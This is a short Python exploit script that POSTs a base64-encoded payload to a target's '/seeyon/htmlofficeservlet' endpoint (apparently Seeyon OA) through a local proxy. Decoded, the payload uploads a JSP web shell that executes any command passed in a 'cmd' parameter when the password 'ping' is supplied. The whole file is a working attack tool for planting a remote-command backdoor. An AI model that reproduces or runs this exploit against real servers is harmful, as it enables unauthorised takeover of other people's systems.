#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# __author__:leezp
# __date__:2019-06-30
# Local:  Win7 (python3)
# 上传 demo，单个上传测试vul
# ***Configure the agent before running***
from urllib import request
import requests
import base64
import urllib

# 输入要测试的url
url = ''
# 这是代理IP
proxies = [{'http': '127.0.0.1:1081', 'https': 'socks5h://127.0.0.1:1081'}]  # 使用时需要ss填写正确，并且关闭代理软件
# 创建ProxyHandler
httpproxy_handler = request.ProxyHandler(proxies[0])
nullproxy_handler = request.ProxyHandler({})
# 定义一个代理开关
proxySwitch = True
# 根据代理开关是否打开，使用不同的代理模式
if proxySwitch:
    # 创建Opener
    opener = request.build_opener(httpproxy_handler)
else:
    opener = request.build_opener(nullproxy_handler)

headers = [{'User-Agent':
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}]
post_payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkZDFRNXlpS1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpe1N0cmluZ0J1aWxkZXIgbGluZSA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7dHJ5IHtQcm9jZXNzIHBybyA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoYyk7QnVmZmVyZWRSZWFkZXIgYnVmID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihwcm8uZ2V0SW5wdXRTdHJlYW0oKSkpO1N0cmluZyB0ZW1wID0gbnVsbDt3aGlsZSAoKHRlbXAgPSBidWYucmVhZExpbmUoKSkhPSBudWxsKSB7bGluZS5hcHBlbmQodGVtcCArICJcbiIpO31idWYuY2xvc2UoKTt9Y2F0Y2goRXhjZXB0aW9uIGUpIHtsaW5lLmFwcGVuZChlLmdldE1lc3NhZ2UoKSk7fXJldHVybiBsaW5lLnRvU3RyaW5nKCk7fSU+PCVpZiAoInBpbmciLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpJiYhIiIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkpIHtvdXQucHJpbnRsbigiPHByZT4iICsgZXhjdXRlQ21kKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkrICI8L3ByZT4iKTt9IGVsc2Uge291dC5wcmludGxuKCI6LSkiKTt9JT42ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ=="
post_payload = base64.b64decode(post_payload)
# urllib.request.HTTPCookieProcessor(cookiejar=None)
requests.packages.urllib3.disable_warnings()

url = url + '/seeyon/htmlofficeservlet'
request = urllib.request.Request(url, data=post_payload, headers=headers[0])
response = opener.open(request)

# 读取相应信息并解码
html = response.read().decode("utf-8")
# 打印信息
print(html)
